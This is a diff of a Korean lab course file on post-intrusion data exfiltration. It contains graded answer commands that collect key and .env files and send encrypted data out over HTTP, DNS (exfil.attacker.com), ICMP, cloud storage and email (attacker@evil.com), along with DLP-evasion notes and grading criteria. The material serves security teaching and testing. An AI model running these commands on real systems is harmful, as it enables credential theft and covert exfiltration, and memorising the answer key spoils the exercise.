@@ -3,7 +3,8 @@ title: 데이터 유출 기법
 version: non-ai
 course: attack-adv-nonai
 week: 10
-description: 침투 후 데이터를 은밀하게 외부로 유출하는 다양한 기법을 실습한다. DNS, HTTP, ICMP, 스테가노그래피 등 다양한 채널을 통한 데이터 유출과 탐지 회피를 다룬다.
+description: 침투 후 데이터를 은밀하게 외부로 유출하는 다양한 기법을 실습한다. DNS, HTTP, ICMP, 스테가노그래피 등 다양한 채널을 통한 데이터 유출과 탐지 회피를
+  다룬다.
 difficulty: hard
 duration_minutes: 120
 objectives:
@@ -17,198 +18,465 @@ steps:
   hint: find 명령으로 .conf, .key, .pem, .env 파일을 검색한다
   category: recon
   points: 10
-  answer: mkdir -p /tmp/exfil_staging && find /etc /home -name '*.conf' -o -name '*.key' -o -name '*.pem' -o -name '.env' 2>/dev/null | head -10 > /tmp/exfil_staging/file_list.txt && echo 'hostname:' $(hostname)
-    > /tmp/exfil_staging/sysinfo.txt && id >> /tmp/exfil_staging/sysinfo.txt && ip addr | grep inet >> /tmp/exfil_staging/sysinfo.txt && cat /tmp/exfil_staging/file_list.txt && echo '---' && cat /tmp/exfil_staging/sysinfo.txt
-  answer_detail: 데이터 유출의 첫 단계는 스테이징(Staging)이다. 민감 파일을 하나의 디렉토리에 수집하고, 압축/암호화 후 유출한다. 시스템 정보, 네트워크 구성, 자격증명 파일이 주요 대상이다. MITRE ATT&CK T1074(Data Staged)에 해당한다.
+  answer: mkdir -p /tmp/exfil_staging && find /etc /home -name '*.conf' -o -name '*.key' -o -name '*.pem'
+    -o -name '.env' 2>/dev/null | head -10 > /tmp/exfil_staging/file_list.txt && echo 'hostname:' $(hostname)
+    > /tmp/exfil_staging/sysinfo.txt && id >> /tmp/exfil_staging/sysinfo.txt && ip addr | grep inet >>
+    /tmp/exfil_staging/sysinfo.txt && cat /tmp/exfil_staging/file_list.txt && echo '---' && cat /tmp/exfil_staging/sysinfo.txt
+  answer_detail: 데이터 유출의 첫 단계는 스테이징(Staging)이다. 민감 파일을 하나의 디렉토리에 수집하고, 압축/암호화 후 유출한다. 시스템 정보, 네트워크 구성,
+    자격증명 파일이 주요 대상이다. MITRE ATT&CK T1074(Data Staged)에 해당한다.
   verify:
     type: output_contains
     expect: exfil_staging
     field: stdout
+    semantic:
+      intent: 데이터 스테이징 — mkdir /tmp/exfil_staging + find /etc /home -name *.conf/.key/.pem/.env + hostname/id/ip
+        addr 시스템 정보. MITRE T1074 Data Staged. 민감 파일 1개 디렉터리 수집 → 후속 압축/암호화/유출. PTES Post-Exploit.
+      success_criteria:
+      - exfil_staging 디렉터리
+      - find + 민감 확장자
+      - 시스템 정보 수집
+      acceptable_methods:
+      - mkdir + find 수집
+      - robocopy /COPY:DT /S
+      - tar + 추출 후 staging
+      negative_signs:
+      - 디렉터리 없음
+      - 파일 검색 없음
+      - 스테이징 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: 수집된 데이터를 tar로 압축하고 openssl로 AES-256 암호화하라.
   hint: tar czf로 압축하고, openssl enc -aes-256-cbc로 암호화한다
   category: exploit
   points: 10
-  answer: tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl enc -aes-256-cbc -salt -in /tmp/exfil_data.tar.gz -out /tmp/exfil_data.enc -pass pass:ExfilKey2026 -pbkdf2 && ls -la /tmp/exfil_data.enc
+  answer: tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl enc -aes-256-cbc -salt -in
+    /tmp/exfil_data.tar.gz -out /tmp/exfil_data.enc -pass pass:ExfilKey2026 -pbkdf2 && ls -la /tmp/exfil_data.enc
     && echo '' && echo 'Original:' && ls -la /tmp/exfil_data.tar.gz && echo 'Encrypted:' && file /tmp/exfil_data.enc
-  answer_detail: 암호화는 네트워크 전송 시 DLP/IDS가 내용을 분석하지 못하게 한다. AES-256-CBC는 강력한 대칭 암호화이며, -pbkdf2로 키 유도를 강화한다. 실제 APT 그룹은 커스텀 암호화나 XOR 인코딩으로 시그니처 탐지를 회피하기도 한다.
+  answer_detail: 암호화는 네트워크 전송 시 DLP/IDS가 내용을 분석하지 못하게 한다. AES-256-CBC는 강력한 대칭 암호화이며, -pbkdf2로 키 유도를 강화한다.
+    실제 APT 그룹은 커스텀 암호화나 XOR 인코딩으로 시그니처 탐지를 회피하기도 한다.
   verify:
     type: output_contains
     expect: exfil_data.enc
     field: stdout
+    semantic:
+      intent: 압축 + AES-256 암호화 — tar czf staging.tar.gz + openssl enc -aes-256-cbc -salt -pbkdf2 -pass
+        pass:key. DLP/IDS 내용 분석 회피. APT는 커스텀/XOR로 시그니처 회피. MITRE T1560.001 Archive via Utility + T1573.002
+        Asymmetric Crypto.
+      success_criteria:
+      - tar czf + openssl enc
+      - exfil_data.enc 출력
+      - AES-256-CBC + pbkdf2
+      acceptable_methods:
+      - openssl AES-256
+      - gpg --symmetric
+      - age 암호화
+      negative_signs:
+      - 압축 없음
+      - 암호화 없음
+      - 키 파생 (-pbkdf2) 누락
   target_vm: attacker
 - order: 3
   instruction: HTTP를 통한 데이터 유출을 시뮬레이션하라. curl POST 요청으로 암호화된 데이터를 Base64 인코딩하여 전송하라.
   hint: base64로 인코딩하고, curl -X POST -d로 전송한다
   category: exploit
   points: 10
-  answer: 'ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo -n $ENCODED | wc -c) bytes (base64)" && echo "First 100 chars: ${ENCODED:0:100}..." && curl -s -X POST -d "upload=$ENCODED"
-    http://10.20.30.80:3000/api/Feedbacks -o /dev/null -w ''HTTP Status: %{http_code}'' 2>/dev/null && echo '''''
-  answer_detail: HTTP POST를 통한 데이터 유출은 가장 일반적인 방법이다. 정상적인 웹 트래픽으로 위장할 수 있으며, HTTPS를 사용하면 내용이 암호화된다. DLP 시스템은 HTTP 본문의 크기, Base64 패턴, 높은 엔트로피를 탐지 지표로 활용한다. MITRE ATT&CK T1048.001에 해당한다.
+  answer: 'ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo -n $ENCODED | wc -c)
+    bytes (base64)" && echo "First 100 chars: ${ENCODED:0:100}..." && curl -s -X POST -d "upload=$ENCODED"
+    http://10.20.30.80:3000/api/Feedbacks -o /dev/null -w ''HTTP Status: %{http_code}'' 2>/dev/null &&
+    echo '''''
+  answer_detail: HTTP POST를 통한 데이터 유출은 가장 일반적인 방법이다. 정상적인 웹 트래픽으로 위장할 수 있으며, HTTPS를 사용하면 내용이 암호화된다. DLP
+    시스템은 HTTP 본문의 크기, Base64 패턴, 높은 엔트로피를 탐지 지표로 활용한다. MITRE ATT&CK T1048.001에 해당한다.
   verify:
     type: output_contains
     expect: Data size
     field: stdout
+    semantic:
+      intent: 'HTTP 유출 — ENCODED=$(base64 -w 0 file) + curl -X POST -d upload=$ENCODED /api/Feedbacks.
+        MITRE T1048.001 Exfiltration Over Symmetric Encrypted Non-C2 Protocol. HTTPS는 내용 암호화. DLP: POST
+        크기/Base64/엔트로피 탐지.'
+      success_criteria:
+      - base64 인코딩 + curl POST
+      - Data size 키워드
+      - HTTP 상태 출력
+      acceptable_methods:
+      - curl POST + base64
+      - Telegram/Discord webhook
+      - GitHub Gist API
+      negative_signs:
+      - 인코딩 없음
+      - POST 없음
+      - DLP 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: DNS를 통한 데이터 유출을 시뮬레이션하라. 파일 내용을 Base32로 인코딩하여 DNS 쿼리의 서브도메인으로 전송하라.
   hint: base32로 인코딩하고 63자씩 분할하여 DNS 쿼리 라벨로 사용한다
   category: exploit
   points: 10
-  answer: 'echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w 50 | head -5 | while read chunk; do echo "DNS query: ${chunk}.exfil.attacker.com"; done && echo '''' && echo ''DNS exfil characteristics:''
-    && echo ''- Max label length: 63 chars'' && echo ''- Max query length: 253 chars'' && echo ''- Throughput: ~10-50 KB/min'' && echo ''- Detection: query length, entropy, volume'''
-  answer_detail: DNS 유출은 거의 모든 환경에서 DNS(53)가 허용되는 점을 악용한다. 데이터를 Base32/Base64로 인코딩하여 서브도메인 라벨에 포함하고, 공격자의 권한 있는 DNS 서버에서 수신한다. 대역폭은 낮지만 방화벽 우회에 효과적이다. 탐지를 위해 DNS 쿼리 길이와 엔트로피를 모니터링한다.
+  answer: 'echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w 50 | head -5 | while read
+    chunk; do echo "DNS query: ${chunk}.exfil.attacker.com"; done && echo '''' && echo ''DNS exfil characteristics:''
+    && echo ''- Max label length: 63 chars'' && echo ''- Max query length: 253 chars'' && echo ''- Throughput:
+    ~10-50 KB/min'' && echo ''- Detection: query length, entropy, volume'''
+  answer_detail: DNS 유출은 거의 모든 환경에서 DNS(53)가 허용되는 점을 악용한다. 데이터를 Base32/Base64로 인코딩하여 서브도메인 라벨에 포함하고, 공격자의
+    권한 있는 DNS 서버에서 수신한다. 대역폭은 낮지만 방화벽 우회에 효과적이다. 탐지를 위해 DNS 쿼리 길이와 엔트로피를 모니터링한다.
   verify:
     type: output_contains
     expect: DNS query
     field: stdout
+    semantic:
+      intent: 'DNS 유출 — base32 인코딩 + fold -w 50 청크 + ${chunk}.exfil.attacker.com 쿼리. Max label 63 / Max
+        query 253 / Throughput ~10-50 KB/min. 권한 DNS 수신. MITRE T1048.003 + T1071.004. 탐지: 쿼리 길이/엔트로피/볼륨.'
+      success_criteria:
+      - DNS query 키워드
+      - base32/base64 인코딩 + 분할
+      - DNS 라벨 제한 (63/253) 명시
+      acceptable_methods:
+      - base32 + fold + dig
+      - iodine/dnscat2 자동
+      - DNSExfiltrator
+      negative_signs:
+      - 인코딩 없음
+      - 라벨 제한 없음
+      - DNS 쿼리 미구성
   target_vm: attacker
 - order: 5
   instruction: ICMP를 통한 데이터 유출을 시뮬레이션하라. ping의 데이터 필드에 정보를 포함하여 전송하는 원리를 보여라.
   hint: xxd로 데이터를 16진수로 변환하고 ping -p 옵션으로 전송한다
   category: exploit
   points: 10
-  answer: 'DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX" && echo "Sending via ICMP data field:" && ping -c 1 -p $DATA_HEX -s 64 10.20.30.80 2>&1 | head -5 && echo '''' && echo
-    ''ICMP exfil tools: icmpsh, icmp-exfil, ptunnel'' && echo ''Detection: ICMP payload size > 64 bytes, high frequency'''
-  answer_detail: ICMP 유출은 ICMP 패킷의 데이터 필드(최대 65,507 바이트)에 정보를 숨겨 전송한다. ping -p 옵션으로 패턴 데이터를 설정하거나, raw 소켓으로 ICMP 패킷을 직접 구성한다. 대부분의 방화벽이 ICMP를 허용하므로 유효하지만, 대역폭이 매우 제한적이다.
+  answer: 'DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX" && echo "Sending via
+    ICMP data field:" && ping -c 1 -p $DATA_HEX -s 64 10.20.30.80 2>&1 | head -5 && echo '''' && echo
+    ''ICMP exfil tools: icmpsh, icmp-exfil, ptunnel'' && echo ''Detection: ICMP payload size > 64 bytes,
+    high frequency'''
+  answer_detail: ICMP 유출은 ICMP 패킷의 데이터 필드(최대 65,507 바이트)에 정보를 숨겨 전송한다. ping -p 옵션으로 패턴 데이터를 설정하거나, raw
+    소켓으로 ICMP 패킷을 직접 구성한다. 대부분의 방화벽이 ICMP를 허용하므로 유효하지만, 대역폭이 매우 제한적이다.
   verify:
     type: output_contains
     expect: Data in hex
     field: stdout
+    semantic:
+      intent: 'ICMP 유출 — DATA_HEX=$(echo exfil | xxd -p) + ping -c 1 -p $DATA_HEX -s 64. ICMP data 필드
+        (max 65,507바이트) 데이터 은닉. 도구: icmpsh/icmp-exfil/ptunnel. MITRE T1095. 탐지: 페이로드 >64바이트 + 빈도. 대역폭
+        제한적.'
+      success_criteria:
+      - Data in hex 키워드
+      - xxd + ping -p
+      - 탐지 (>64 바이트)
+      acceptable_methods:
+      - ping -p hex
+      - icmpsh/ptunnel
+      - scapy IP/ICMP/Raw
+      negative_signs:
+      - xxd 없음
+      - ping -p 없음
+      - 데이터 은닉 맥락 없음
   target_vm: attacker
 - order: 6
   instruction: 스테가노그래피를 사용하여 이미지 파일에 데이터를 숨기는 원리를 시뮬레이션하라. 텍스트 데이터를 파일 끝에 추가하는 기법을 보여라.
   hint: cat으로 이미지와 데이터를 결합하거나, echo >> 로 파일 끝에 데이터를 추가한다
   category: exploit
   points: 10
-  answer: 'echo -e ''GIF89a\x01\x00\x01\x00\x00\x00\x00;'' > /tmp/cover.gif && echo ''SECRET: This is hidden exfiltration data'' >> /tmp/cover.gif && echo ''=== Steganography Simulation ==='' && echo ''Cover
-    file:'' && file /tmp/cover.gif && echo ''Content:'' && strings /tmp/cover.gif && echo '''' && echo ''Real stego tools:'' && echo ''- steghide: embed in JPEG/BMP/WAV/AU'' && echo ''- openstego: LSB embedding''
-    && echo ''- snow: whitespace steganography in text'''
-  answer_detail: 스테가노그래피는 데이터를 무해한 파일(이미지, 오디오)에 숨기는 기법이다. LSB(Least Significant Bit) 인코딩은 픽셀 최하위 비트를 변경하여 육안으로 식별할 수 없게 데이터를 숨긴다. 파일 끝 추가(EOF append)는 가장 단순한 기법이며, steghide는 JPEG에 AES 암호화된 데이터를 삽입한다.
+  answer: 'echo -e ''GIF89a\x01\x00\x01\x00\x00\x00\x00;'' > /tmp/cover.gif && echo ''SECRET: This is
+    hidden exfiltration data'' >> /tmp/cover.gif && echo ''=== Steganography Simulation ==='' && echo
+    ''Cover file:'' && file /tmp/cover.gif && echo ''Content:'' && strings /tmp/cover.gif && echo ''''
+    && echo ''Real stego tools:'' && echo ''- steghide: embed in JPEG/BMP/WAV/AU'' && echo ''- openstego:
+    LSB embedding'' && echo ''- snow: whitespace steganography in text'''
+  answer_detail: 스테가노그래피는 데이터를 무해한 파일(이미지, 오디오)에 숨기는 기법이다. LSB(Least Significant Bit) 인코딩은 픽셀 최하위 비트를
+    변경하여 육안으로 식별할 수 없게 데이터를 숨긴다. 파일 끝 추가(EOF append)는 가장 단순한 기법이며, steghide는 JPEG에 AES 암호화된 데이터를 삽입한다.
   verify:
     type: output_contains
     expect: Steganography
     field: stdout
+    semantic:
+      intent: '스테가노그래피 — GIF89a 매직 + secret >> cover.gif (EOF append). LSB 인코딩(픽셀 최하위 비트). 도구: steghide(JPEG
+        AES) / openstego(LSB) / snow(공백 텍스트). MITRE T1027.003. 분석: binwalk/stegdetect.'
+      success_criteria:
+      - Steganography 키워드
+      - EOF append 또는 LSB 기법
+      - 도구 (steghide/openstego/snow) 언급
+      acceptable_methods:
+      - EOF append
+      - steghide embed
+      - openstego LSB
+      negative_signs:
+      - 은닉 방법 없음
+      - 도구 없음
+      - 분석 도구 없음
   target_vm: attacker
 - order: 7
   instruction: 데이터를 여러 조각으로 분할하여 시간차를 두고 유출하는 기법을 시뮬레이션하라.
   hint: split 명령으로 파일을 분할하고, 일정 간격으로 전송한다
   category: exploit
   points: 10
-  answer: 'split -b 100 /tmp/exfil_data.enc /tmp/chunk_ && echo ''=== Chunked Exfiltration ==='' && ls -la /tmp/chunk_* && echo '''' && echo ''Simulating time-delayed transfer:'' && for chunk in /tmp/chunk_*;
+  answer: 'split -b 100 /tmp/exfil_data.enc /tmp/chunk_ && echo ''=== Chunked Exfiltration ==='' && ls
+    -la /tmp/chunk_* && echo '''' && echo ''Simulating time-delayed transfer:'' && for chunk in /tmp/chunk_*;
     do echo "$(date ''+%H:%M:%S'') Sending: $chunk ($(wc -c < $chunk) bytes)"; done && rm -f /tmp/chunk_*'
-  answer_detail: 청크 기반 유출은 대용량 데이터를 작은 조각으로 분할하여 시간차를 두고 전송한다. DLP의 크기 기반 임계값과 단일 전송 탐지를 회피한다. 실제 APT 그룹은 업무 시간에만 소량씩, 정상 트래픽 패턴과 유사하게 전송하여 이상행위 탐지를 어렵게 만든다.
+  answer_detail: 청크 기반 유출은 대용량 데이터를 작은 조각으로 분할하여 시간차를 두고 전송한다. DLP의 크기 기반 임계값과 단일 전송 탐지를 회피한다. 실제 APT
+    그룹은 업무 시간에만 소량씩, 정상 트래픽 패턴과 유사하게 전송하여 이상행위 탐지를 어렵게 만든다.
   verify:
     type: output_contains
     expect: Chunked Exfiltration
     field: stdout
+    semantic:
+      intent: 청크 분할 유출 — split -b 100 file chunk_ + 시간차 전송 시뮬. DLP 크기 임계/단일 전송 탐지 회피. APT는 업무 시간 + 정상
+        패턴 유사 + 소량씩. MITRE T1030 Data Transfer Size Limits + T1029 Scheduled Transfer.
+      success_criteria:
+      - Chunked Exfiltration 키워드
+      - split -b + 청크 분할
+      - 시간차 전송 (date 출력)
+      acceptable_methods:
+      - split -b
+      - dd bs=N count=N + 루프
+      - Python chunked POST
+      negative_signs:
+      - split 없음
+      - 단일 전송
+      - 시간차 없음
   target_vm: attacker
 - order: 8
   instruction: 클라우드 스토리지를 통한 데이터 유출을 시뮬레이션하라. curl로 클라우드 API 형태의 업로드 요청을 구성하라.
   hint: AWS S3, Google Cloud Storage 등의 API 형식으로 업로드 요청을 시뮬레이션한다
   category: exploit
   points: 10
-  answer: "echo -e '=== Cloud Storage Exfiltration ===\\n\\n[AWS S3]\\ncurl \\\n     -X PUT -T /tmp/exfil_data.enc \\\\\\n  https://attacker-bucket.s3.amazonaws.com/data.enc \\\\\\n \\\n     -H \"Authorization:\
-    \ AWS AKIAIOSFODNN7EXAMPLE:signature\"\\n\\n[Google Cloud Storage]\\ncurl \\\n     -X POST -T /tmp/exfil_data.enc \\\\\\n  https://storage.googleapis.com/upload/storage/v1/b/bucket/o \\\\\\n \\\n  \
-    \   -H \"Authorization: Bearer token\"\\n\\n[Azure Blob]\\ncurl \\\n     -X PUT -T /tmp/exfil_data.enc \\\\\\n  https://account.blob.core.windows.net/container/data.enc \\\\\\n \\\n     -H \"x-ms-blob-type:\
-    \ BlockBlob\"\\n\\n[Detection Challenge]\\n- Traffic goes to legitimate cloud endpoints\\n- HTTPS encrypted, content not inspectable\\n- Same domains used by legitimate business\\n\\n[Defense]\\n- Cloud\
-    \ Access Security Broker (CASB)\\n- Restrict cloud storage access by policy\\n- Monitor unusual upload volumes'"
-  answer_detail: 클라우드 스토리지 유출은 합법적 클라우드 서비스(S3, GCS, Azure Blob)를 데이터 수신처로 사용한다. 트래픽이 합법적 도메인으로 향하므로 도메인 기반 필터링이 무력화된다. CASB(Cloud Access Security Broker)만이 클라우드 API 수준에서 비인가 접근을 탐지할 수 있다.
+  answer: "echo -e '=== Cloud Storage Exfiltration ===\\n\\n[AWS S3]\\ncurl \\\n     -X PUT -T /tmp/exfil_data.enc\
+    \ \\\\\\n  https://attacker-bucket.s3.amazonaws.com/data.enc \\\\\\n \\\n     -H \"Authorization:\
+    \ AWS AKIAIOSFODNN7EXAMPLE:signature\"\\n\\n[Google Cloud Storage]\\ncurl \\\n     -X POST -T /tmp/exfil_data.enc\
+    \ \\\\\\n  https://storage.googleapis.com/upload/storage/v1/b/bucket/o \\\\\\n \\\n     -H \"Authorization:\
+    \ Bearer token\"\\n\\n[Azure Blob]\\ncurl \\\n     -X PUT -T /tmp/exfil_data.enc \\\\\\n  https://account.blob.core.windows.net/container/data.enc\
+    \ \\\\\\n \\\n     -H \"x-ms-blob-type: BlockBlob\"\\n\\n[Detection Challenge]\\n- Traffic goes to\
+    \ legitimate cloud endpoints\\n- HTTPS encrypted, content not inspectable\\n- Same domains used by\
+    \ legitimate business\\n\\n[Defense]\\n- Cloud Access Security Broker (CASB)\\n- Restrict cloud storage\
+    \ access by policy\\n- Monitor unusual upload volumes'"
+  answer_detail: 클라우드 스토리지 유출은 합법적 클라우드 서비스(S3, GCS, Azure Blob)를 데이터 수신처로 사용한다. 트래픽이 합법적 도메인으로 향하므로 도메인
+    기반 필터링이 무력화된다. CASB(Cloud Access Security Broker)만이 클라우드 API 수준에서 비인가 접근을 탐지할 수 있다.
   verify:
     type: output_contains
     expect: Cloud Storage Exfiltration
     field: stdout
+    semantic:
+      intent: '클라우드 스토리지 유출 — AWS S3 (curl PUT + Authorization AWS) + GCS (Bearer token) + Azure Blob
+        (x-ms-blob-type: BlockBlob). 합법 도메인으로 향함 → 도메인 필터 무력화. CASB만 클라우드 API 수준 탐지. MITRE T1567.002.'
+      success_criteria:
+      - Cloud Storage Exfiltration 키워드
+      - AWS/GCS/Azure 3종 + curl PUT/POST
+      - CASB 방어 언급
+      acceptable_methods:
+      - S3/GCS/Azure API + curl
+      - rclone 자동 동기화
+      - GitHub Actions secrets exfil
+      negative_signs:
+      - 클라우드 1종만
+      - API 형식 없음
+      - CASB 누락
   target_vm: attacker
 - order: 9
   instruction: email을 통한 데이터 유출을 분석하라. SMTP를 사용하여 암호화된 데이터를 첨부파일로 전송하는 과정을 시뮬레이션하라.
   hint: curl --mail-from --mail-rcpt 또는 sendmail 명령을 사용한다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== Email-Based Exfiltration ===\n\n[Method 1: SMTP via curl]\ncurl --url smtp://mail.server:25 \\\n  --mail-from sender@lab.local \\\n  --mail-rcpt attacker@evil.com \\\n  -T email.txt\n\n[Method
-    2: Base64 in email body]\nDATA=$(base64 /tmp/exfil_data.enc)\necho "Subject: Report" | sendmail -f user@lab.local attacker@evil.com\n\n[Method 3: Draft folder staging]\n- Save data in email draft (IMAP)\n-
-    Retrieve from external device\n- No outbound email generated\n\n[Detection]\n- DLP scanning outbound email attachments\n- Encrypted attachment alerts\n- Unusual recipient domains\n- Large attachment
+  answer: 'echo -e ''=== Email-Based Exfiltration ===\n\n[Method 1: SMTP via curl]\ncurl --url smtp://mail.server:25
+    \\\n  --mail-from sender@lab.local \\\n  --mail-rcpt attacker@evil.com \\\n  -T email.txt\n\n[Method
+    2: Base64 in email body]\nDATA=$(base64 /tmp/exfil_data.enc)\necho "Subject: Report" | sendmail -f
+    user@lab.local attacker@evil.com\n\n[Method 3: Draft folder staging]\n- Save data in email draft (IMAP)\n-
+    Retrieve from external device\n- No outbound email generated\n\n[Detection]\n- DLP scanning outbound
+    email attachments\n- Encrypted attachment alerts\n- Unusual recipient domains\n- Large attachment
     size thresholds\n- Draft folder access from multiple IPs'''
-  answer_detail: 이메일 유출은 조직의 정상적인 이메일 인프라를 악용한다. 암호화된 첨부파일은 DLP의 내용 검사를 회피한다. 이메일 드래프트 폴더를 공유 저장소로 사용하면 발신 기록이 남지 않아 탐지가 더 어렵다. DLP는 암호화된 첨부파일에 대한 알림 정책을 구현해야 한다.
+  answer_detail: 이메일 유출은 조직의 정상적인 이메일 인프라를 악용한다. 암호화된 첨부파일은 DLP의 내용 검사를 회피한다. 이메일 드래프트 폴더를 공유 저장소로 사용하면
+    발신 기록이 남지 않아 탐지가 더 어렵다. DLP는 암호화된 첨부파일에 대한 알림 정책을 구현해야 한다.
   verify:
     type: output_contains
     expect: Email-Based Exfiltration
     field: stdout
+    semantic:
+      intent: 'Email 유출 — SMTP curl --mail-from --mail-rcpt -T email.txt + base64 본문 + 드래프트 폴더 스테이징(IMAP,
+        발신 기록 X). MITRE T1048.003 + T1102 Web Service. 정상 이메일 인프라 악용. 방어: DLP 첨부 + 암호화 알림 + 외부 도메인 + 크기
+        임계 + 드래프트 다중 IP.'
+      success_criteria:
+      - Email-Based Exfiltration 키워드
+      - SMTP curl 또는 sendmail + 변형 3종
+      - DLP 방어 (5개 이상)
+      acceptable_methods:
+      - curl SMTP
+      - sendmail/msmtp
+      - Python smtplib
+      negative_signs:
+      - SMTP 없음
+      - 방어 없음
+      - 변형 1개 이하
   target_vm: attacker
 - order: 10
   instruction: 물리적 매체를 통한 데이터 유출을 분석하라. USB, Bluetooth 등 오프라인 채널의 위험성을 문서화하라.
   hint: USB 장치 연결 감지, Bluetooth 파일 전송 등을 다룬다
   category: analysis
   points: 10
-  answer: 'echo ''=== Physical Exfiltration Channels ==='' && echo '''' && echo ''[USB Storage]'' && lsusb 2>/dev/null | head -5 && echo ''Detection: USB device insertion logs (udev/Sysmon)'' && echo ''''
-    && echo ''[Bluetooth]'' && echo ''hcitool scan -> discover nearby devices'' && echo ''obexftp -b MAC -p file -> transfer via OBEX'' && echo '''' && echo ''[Other Channels]'' && echo ''- Screen capture
-    / photography'' && echo ''- Printed documents'' && echo ''- Audio (ultrasonic data transmission)'' && echo ''- WiFi (rogue AP for data transfer)'' && echo '''' && echo ''[Defense]'' && echo ''- USB
-    device control (endpoint DLP)'' && echo ''- Disable Bluetooth on sensitive systems'' && echo ''- Screen watermarking'' && echo ''- Physical security controls'''
-  answer_detail: 물리적 유출 채널은 네트워크 기반 DLP로 탐지할 수 없다. USB 대용량 저장장치, Bluetooth 파일 전송, 화면 촬영, 인쇄물 등이 포함된다. 엔드포인트 DLP로 USB 장치를 제어하고, Bluetooth를 비활성화하며, 화면 워터마킹으로 스크린 캡처를 추적할 수 있다.
+  answer: 'echo ''=== Physical Exfiltration Channels ==='' && echo '''' && echo ''[USB Storage]'' && lsusb
+    2>/dev/null | head -5 && echo ''Detection: USB device insertion logs (udev/Sysmon)'' && echo ''''
+    && echo ''[Bluetooth]'' && echo ''hcitool scan -> discover nearby devices'' && echo ''obexftp -b MAC
+    -p file -> transfer via OBEX'' && echo '''' && echo ''[Other Channels]'' && echo ''- Screen capture
+    / photography'' && echo ''- Printed documents'' && echo ''- Audio (ultrasonic data transmission)''
+    && echo ''- WiFi (rogue AP for data transfer)'' && echo '''' && echo ''[Defense]'' && echo ''- USB
+    device control (endpoint DLP)'' && echo ''- Disable Bluetooth on sensitive systems'' && echo ''- Screen
+    watermarking'' && echo ''- Physical security controls'''
+  answer_detail: 물리적 유출 채널은 네트워크 기반 DLP로 탐지할 수 없다. USB 대용량 저장장치, Bluetooth 파일 전송, 화면 촬영, 인쇄물 등이 포함된다.
+    엔드포인트 DLP로 USB 장치를 제어하고, Bluetooth를 비활성화하며, 화면 워터마킹으로 스크린 캡처를 추적할 수 있다.
   verify:
     type: output_contains
     expect: Physical Exfiltration
     field: stdout
+    semantic:
+      intent: '물리적 유출 채널 — USB(lsusb, udev/Sysmon 로그) + Bluetooth(hcitool scan + obexftp) + 화면 촬영 + 인쇄물
+        + Audio 초음파 + Rogue WiFi AP. 네트워크 DLP 미탐지. 방어: 엔드포인트 DLP USB 통제 + Bluetooth 비활성 + 화면 워터마킹 + 물리
+        보안. MITRE T1052 Exfiltration Over Physical Medium.'
+      success_criteria:
+      - Physical Exfiltration 키워드
+      - USB + Bluetooth + 그 외 4가지 이상
+      - 엔드포인트 DLP 방어
+      acceptable_methods:
+      - lsusb + obexftp 시뮬
+      - USBKill/USB Rubber Ducky
+      - 고급 audiojack 데이터
+      negative_signs:
+      - 채널 2개 이하
+      - 엔드포인트 DLP 누락
+      - 물리 보안 맥락 없음
   target_vm: attacker
 - order: 11
   instruction: 데이터 유출 속도와 은닉성의 트레이드오프를 분석하라. 각 유출 채널의 대역폭과 탐지 난이도를 비교하라.
   hint: HTTP, DNS, ICMP, Email 등 각 채널의 특성을 표로 정리한다
   category: analysis
   points: 10
-  answer: 'echo -e ''=== Exfiltration Channel Comparison ===\n\nChannel      | Bandwidth   | Stealth  | Availability | Detection\n------------ | ----------- | -------- | ------------ | ----------\nHTTPS        |
-    High (MB/s) | Medium   | Usually      | DLP, proxy\nDNS          | Low (KB/s)  | High     | Almost always| DNS analytics\nICMP         | Low (KB/s)  | High     | Usually      | Payload analysis\nEmail        |
-    Medium      | Medium   | Usually      | Email DLP\nCloud        | High        | High     | Varies       | CASB\nSteganography| Low         | Very High| Always       | Stego analysis\nPhysical     |
-    High        | High     | Physical     | Endpoint DLP\n\nOptimal strategy: Combine channels for redundancy\nAdapt to target environment restrictions'''
-  answer_detail: 유출 채널 선택은 데이터 양, 시간 제약, 네트워크 환경에 따라 달라진다. 대용량 데이터는 HTTPS/Cloud가, 제한된 환경에서는 DNS/ICMP가 적합하다. APT 그룹은 여러 채널을 병행하여 한 채널이 차단되어도 유출을 계속한다. 방어는 모든 채널을 동시에 모니터링해야 한다.
+  answer: 'echo -e ''=== Exfiltration Channel Comparison ===\n\nChannel      | Bandwidth   | Stealth  |
+    Availability | Detection\n------------ | ----------- | -------- | ------------ | ----------\nHTTPS        |
+    High (MB/s) | Medium   | Usually      | DLP, proxy\nDNS          | Low (KB/s)  | High     | Almost
+    always| DNS analytics\nICMP         | Low (KB/s)  | High     | Usually      | Payload analysis\nEmail        |
+    Medium      | Medium   | Usually      | Email DLP\nCloud        | High        | High     | Varies       |
+    CASB\nSteganography| Low         | Very High| Always       | Stego analysis\nPhysical     | High        |
+    High     | Physical     | Endpoint DLP\n\nOptimal strategy: Combine channels for redundancy\nAdapt
+    to target environment restrictions'''
+  answer_detail: 유출 채널 선택은 데이터 양, 시간 제약, 네트워크 환경에 따라 달라진다. 대용량 데이터는 HTTPS/Cloud가, 제한된 환경에서는 DNS/ICMP가
+    적합하다. APT 그룹은 여러 채널을 병행하여 한 채널이 차단되어도 유출을 계속한다. 방어는 모든 채널을 동시에 모니터링해야 한다.
   verify:
     type: output_contains
     expect: Exfiltration Channel Comparison
     field: stdout
+    semantic:
+      intent: 유출 채널 비교 — HTTPS(High BW/Medium 은닉/DLP-proxy) + DNS(Low/High/DNS analytics) + ICMP(Low/High/payload)
+        + Email(Medium/Medium/email DLP) + Cloud(High/High/CASB) + Steganography(Low/Very High/stego)
+        + Physical(High/High/endpoint). 다중 채널 redundancy + 환경 적응.
+      success_criteria:
+      - Exfiltration Channel Comparison 키워드
+      - 채널 5개 이상 비교
+      - Bandwidth + Stealth + Detection 차원
+      acceptable_methods:
+      - 채널 매트릭스 비교
+      - MITRE ATT&CK Exfiltration TA0010
+      - Threat Modeling 채널 평가
+      negative_signs:
+      - 채널 3개 이하
+      - 비교 차원 부족
